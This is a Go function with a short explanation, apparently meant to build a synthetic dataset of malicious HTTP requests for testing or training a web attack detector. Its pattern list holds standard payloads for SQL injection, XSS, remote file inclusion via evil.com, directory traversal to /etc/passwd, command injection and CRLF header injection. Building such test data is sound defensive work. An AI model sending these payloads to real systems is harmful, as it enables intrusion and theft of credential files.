func generateMaliciousDataset(numRequests int) []HttpRequest {
	maliciousPatterns := []string{
		// SQL Injection
		"' OR 1=1",
		"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
		"1 AND (SELECT * FROM (SELECT(SLEEP(5)))example) AND '1",

		// XSS
		"<script>alert('XSS');</script>",
		"<img src=x onerror=alert('XSS');>",
		"<svg/onload=alert('XSS')>",

		// RFI
		"http://www.evil.com/shell.php",
		"http://www.evil.com/malicious.txt",

		// Directory Traversal
		"../../../../etc/passwd",
		"../../../../var/www/html/config.php",

		// Command Injection
		"127.0.0.1;ls",
		"127.0.0.1;cat /etc/passwd",

		// Header Injection
		"\r\nSet-Cookie:malicious_cookie=value",
		"\r\nLocation: http://www.evil.com",

		// Remote File Inclusion (RFI)
		"http://www.evil.com/shell.php",
		"http://www.evil.com/malicious.txt",

		// SQL Injection via POST
		"username=admin' OR 1=1 --&password=test",
		"username=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055&password=test",

		// XSS via POST
		"username=<script>alert('XSS');</script>&password=test",
		"username=<img src=x onerror=alert('XSS');>&password=test",
		"username=<svg/onload=alert('XSS')>&password=test",

		// Directory Traversal via POST
		"filename=../../../../etc/passwd",
		"filename=../../../../var/www/html/config.php",

		// Command Injection via POST
		"command=127.0.0.1;ls",
		"command=127.0.0.1;cat /etc/passwd",

		// Header Injection via POST
		"cookie=\r\nSet-Cookie:malicious_cookie=value",
		"location=\r\nLocation: http://www.evil.com",
	}

	maliciousRequests := make([]HttpRequest, numRequests)

	for i := 0; i < numRequests; i++ {
		pattern := maliciousPatterns[rand.Intn(len(maliciousPatterns))]
		request := HttpRequest{
			Method: "GET",
			URL:    fmt.Sprintf("/?param=%s", pattern),
			Headers: map[string]string{
				"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
				"Accept-Language": "en-US,en;q=0.5",
			},
			Body: "",
		}
		maliciousRequests[i] = request
	}

	return maliciousRequests
}
```

### Explanation:
- **SQL Injection**: Patterns include common SQL injection techniques such as boolean-based and union-based attacks.
- **XSS**: Patterns include various ways to inject JavaScript and other malicious content into HTML.
- **RFI**: Patterns include URLs that attempt to include remote files.
- **Directory Traversal**: Patterns include paths that attempt to access files outside the intended directory.
- **Command Injection**: Patterns include commands that attempt to execute shell commands.
- **Header Injection**: Patterns include headers that attempt to manipulate HTTP responses.

